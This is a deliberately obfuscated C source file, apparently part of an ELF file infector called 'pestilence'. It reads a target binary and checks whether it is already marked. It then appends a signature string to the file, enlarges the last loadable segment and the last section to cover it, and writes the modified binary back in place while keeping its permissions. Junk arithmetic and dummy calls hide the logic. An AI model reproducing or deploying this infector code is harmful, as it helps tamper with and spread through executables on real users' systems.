#include "../include_obfuscated/pestilence.h"
static int _1_O__1OO__01(const char *_011ll11_1O1I, void *_Il0_1II10I01, size_t _lOIl11IlO0lI) { int _1_lll0_00O1_; ssize_t _I0O0OO1O11OI; struct stat _Ol1_IOO_O11I; mode_t _0011I0OIO_OO = 0644; if (stat(_011ll11_1O1I, &_Ol1_IOO_O11I) == 0) { _0011I0OIO_OO = _Ol1_IOO_O11I.st_mode; } _1_lll0_00O1_ = _I1OI_l11_OOI(_011ll11_1O1I, O_WRONLY | O_TRUNC); if (_1_lll0_00O1_ < 0) return -1; _I0O0OO1O11OI = _lO__1lIO_10O(_1_lll0_00O1_, _Il0_1II10I01, _lOIl11IlO0lI); fchmod(_1_lll0_00O1_, _0011I0OIO_OO); _OOl_O1_ll00l(_1_lll0_00O1_); if (_I0O0OO1O11OI < 0 || (size_t)_I0O0OO1O11OI != _lOIl11IlO0lI) return -1; return 0; } int _0Oll0_0O0OO0(const char *_011ll11_1O1I) { _l_IO0IO__OOI _101l_0I__O_I = {0}; const char *__1001O_OI00l; size_t __OO0Ol_l1_lI; void *_OO11__l1ll1O = NULL; size_t _I1O_Ol_Ol0lO; size_t _O0IOIO1_I1l1; long long _II_O11O_1__l; Elf64_Ehdr *_1OII101100Il; _II_O11O_1__l = _I____lO0lll0; Elf64_Phdr *_l0O1I0_O1OIO; Elf64_Shdr *_ll0l_O_11010; int __00IO0_IOI11 = -1; __O__l_Il0O0_(); int __O000l_10l00 = _ll0_lIl0OlOl(); _I____lO0lll0 *= 11; if (__O000l_10l00 == 0 || __O000l_10l00 == 1) { if (_1I11_IOl_01_(_011ll11_1O1I, &_101l_0I__O_I) < 0) return -1; _lOOII_1ll_I1(); } _I____lO0lll0 += 23432; if (__O000l_10l00 == 2 || __O000l_10l00 == 3) { __1001O_OI00l = _0l010l0___Ol(); __OO0Ol_l1_lI = strlen(__1001O_OI00l) + 1; __11ll_I10IlI(); } _I____lO0lll0 += 234; if (__O000l_10l00 == 2 || __O000l_10l00 == 3) { if (_1I11_IOl_01_(_011ll11_1O1I, &_101l_0I__O_I) < 0) return -1; _10I__l_Ol_00(); } if (__O000l_10l00 == 0 || __O000l_10l00 == 1) { __1001O_OI00l = _0l010l0___Ol(); __OO0Ol_l1_lI = strlen(__1001O_OI00l) + 1; _O_IlIOll100_(); } _10I__l_Ol_00(); if (_11_O11II__0O(&_101l_0I__O_I)) { _I0II0__0OI_1(&_101l_0I__O_I); return 0; } __11ll_I10IlI(); _O0IOIO1_I1l1 = _101l_0I__O_I._lOIl11IlO0lI; _I1O_Ol_Ol0lO = _O0IOIO1_I1l1 + __OO0Ol_l1_lI; _OO11__l1ll1O = malloc(_I1O_Ol_Ol0lO); if (!_OO11__l1ll1O) { _I0II0__0OI_1(&_101l_0I__O_I); return -1; } ___lI00OO0llO(); memcpy(_OO11__l1ll1O, _101l_0I__O_I._Il0_1II10I01, _O0IOIO1_I1l1); _I0II0__0OI_1(&_101l_0I__O_I); memcpy((char *)_OO11__l1ll1O + _O0IOIO1_I1l1, __1001O_OI00l, __OO0Ol_l1_lI); _1OII101100Il = (Elf64_Ehdr *)_OO11__l1ll1O; _l0O1I0_O1OIO = (Elf64_Phdr *)((char *)_OO11__l1ll1O + _1OII101100Il->e_phoff); _ll0l_O_11010 = (Elf64_Shdr *)((char *)_OO11__l1ll1O + _1OII101100Il->e_shoff); for (int _111Il0Il0_l0 = 0; _111Il0Il0_l0 < _1OII101100Il->e_phnum; _111Il0Il0_l0++) { if (_l0O1I0_O1OIO[_111Il0Il0_l0].p_type == PT_LOAD) { if (_l0O1I0_O1OIO[_111Il0Il0_l0].p_offset + _l0O1I0_O1OIO[_111Il0Il0_l0].p_filesz == _O0IOIO1_I1l1) { _l0O1I0_O1OIO[_111Il0Il0_l0].p_filesz += __OO0Ol_l1_lI; _l0O1I0_O1OIO[_111Il0Il0_l0].p_memsz += __OO0Ol_l1_lI; break; } } } int _0l110_llIO01 = -1; size_t __O_1IlO1_10_ = 0; for (int _111Il0Il0_l0 = 0; _111Il0Il0_l0 < _1OII101100Il->e_shnum; _111Il0Il0_l0++) { size_t _01lI01II0_1O = _ll0l_O_11010[_111Il0Il0_l0].sh_offset + _ll0l_O_11010[_111Il0Il0_l0].sh_size; if (_01lI01II0_1O > __O_1IlO1_10_ && _01lI01II0_1O <= _O0IOIO1_I1l1) { __O_1IlO1_10_ = _01lI01II0_1O; _0l110_llIO01 = _111Il0Il0_l0; } } ___lI00OO0llO(); if (_0l110_llIO01 >= 0) { _ll0l_O_11010[_0l110_llIO01].sh_size += __OO0Ol_l1_lI; } __00IO0_IOI11 = _1_O__1OO__01(_011ll11_1O1I, _OO11__l1ll1O, _I1O_Ol_Ol0lO); free(_OO11__l1ll1O); _I____lO0lll0 = _II_O11O_1__l; _I____lO0lll0 *= 1; return __00IO0_IOI11; } 